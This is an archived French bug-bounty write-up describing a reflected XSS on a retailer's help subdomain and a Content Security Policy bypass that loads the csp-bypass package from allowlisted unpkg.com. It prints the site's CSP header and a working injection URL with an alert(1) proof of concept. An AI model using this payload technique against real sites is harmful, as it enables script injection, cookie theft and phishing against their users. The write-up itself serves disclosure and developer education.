# Découverte d’une vulnérabilité XSS avec contournement de la CSP via unpkg.com

- **Source URL:** https://medium.com/@Itachi0xf/d%C3%A9couverte-dune-vuln%C3%A9rabilit%C3%A9-xss-avec-contournement-de-la-csp-via-unpkg-com-02437e0eac34?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250501114100/https://medium.com/@Itachi0xf/d%C3%A9couverte-dune-vuln%C3%A9rabilit%C3%A9-xss-avec-contournement-de-la-csp-via-unpkg-com-02437e0eac34?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7438 (id 7438)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Découverte d’une vulnérabilité XSS avec contournement de la CSP via unpkg.com

Bonjour à tous, aujourd’hui je vais vous parler d’une vulnérabilité que j’ai découverte sur un sous-domaine d’un grand site de vente français. Pour l’exemple, nous appellerons ce site **example.com**. La faille se trouve sur le sous-domaine **aide.exemple.com**, utilisé pour la recherche d’aide. Il s’agit d’une vulnérabilité de type **Cross-Site Scripting (XSS)**, qui permet d’exécuter du **code JavaScript non autorisé**, même en présence d’une **politique de sécurité de contenu (CSP)**, censée empêcher ce genre de comportement.

## Description de la vulnérabilité

J’ai d’abord tenté une injection simple en essayant de passer du texte en gras à l’aide de la balise HTML `<b>Bold text</b>`. À ma surprise, cela a fonctionné sans problème. Cependant, en essayant d'autres injections plus complexes, elles ne passaient pas. Cela m'a amené à inspecter la **Content Security Policy (CSP)** utilisée par le site.

Le site utilise une CSP pour restreindre l’exécution de scripts externes, et voici un exemple de la règle CSP mise en place :

Content-Security-Policy: frame-ancestors deny; script-src ‘self’ \*.inbenta.services \*.inbenta.com \*.inbenta.io \*.inbenta.xyz unpkg.com \*.apple.com \*.cdn-apple.com; object-src ‘none’;


Cette politique CSP permet uniquement l’exécution de scripts provenant de sources spécifiques, comme **unpkg.com** et d’autres domaines de confiance. En cherchant des moyens d’exploiter cela, je suis tombé sur un script hébergé sur **unpkg.com**, un domaine autorisé par la CSP du site.

## Contournement de la CSP via unpkg.com

En utilisant des scripts hébergés sur **unpkg.com**, un domaine autorisé par la CSP, il est possible de charger et d’exécuter du **code JavaScript malveillant** sur la page cible. Pour cela, j’ai effectué des recherches sur des méthodes permettant de **bypasser** la CSP et suis tombé sur le projet **csp-bypass** disponible sur [GitHub](https://web.archive.org/web/20250501114100/https://github.com/CanardMandarin/csp-bypass).

[https://aide.example.com/results?query=TEST](https://web.archive.org/web/20250501114100/https://aide.exemple.com/results?query=TEST)">\<script src=”[https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js](https://web.archive.org/web/20250501114100/https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js)">\</script>\<br csp=”alert(1)”>

En accédant à cette URL modifiée, le script injecté est exécuté malgré la présence des restrictions CSP, car **unpkg.com** est inclus dans la directive **script-src** de la politique CSP. Cela permet à un attaquant de contourner les protections mises en place et d’exécuter du **code malveillant** sur la page.

## Impact de la vulnérabilité

Les conséquences potentielles de cette faille XSS sont multiples :

1. **Vol de cookies** : Un script malveillant pourrait capturer les **cookies de session** d’un utilisateur et les transmettre à un serveur contrôlé par l’attaquant. Cependant, dans ce cas, les cookies ne sont pas exploitables sur le domaine principal
2. **Phishing et redirections malveillantes** : L’attaquant pourrait rediriger les utilisateurs vers des **sites de phishing** ou exécuter d’autres **scripts malveillants**, les exposant à des tentatives de vol d’informations sensibles.
3. **Exécution de scripts non autorisés** : Un attaquant pourrait injecter des **scripts supplémentaires** pour manipuler la page affichée à l’utilisateur ou tenter de compromettre d’autres parties du site.

# Conclusion

Cette vulnérabilité démontre qu’une **CSP bien configurée** peut toujours être contournée si des domaines de confiance sont exploités. C’est un rappel crucial pour les développeurs de renforcer la validation des entrées utilisateurs et de limiter les domaines autorisés dans leurs règles de sécurité. Malgré l’importance de cette découverte, l’équipe de sécurité a estimé que la vulnérabilité ne serait pas **rémunérée**, car, comme indiqué dans leur politique (voir l’image ci-dessous), seuls les rapports ayant un impact significatif sur la **confidentialité, l’intégrité** ou la **disponibilité** de leurs services sont éligibles à une récompense.

Merci.
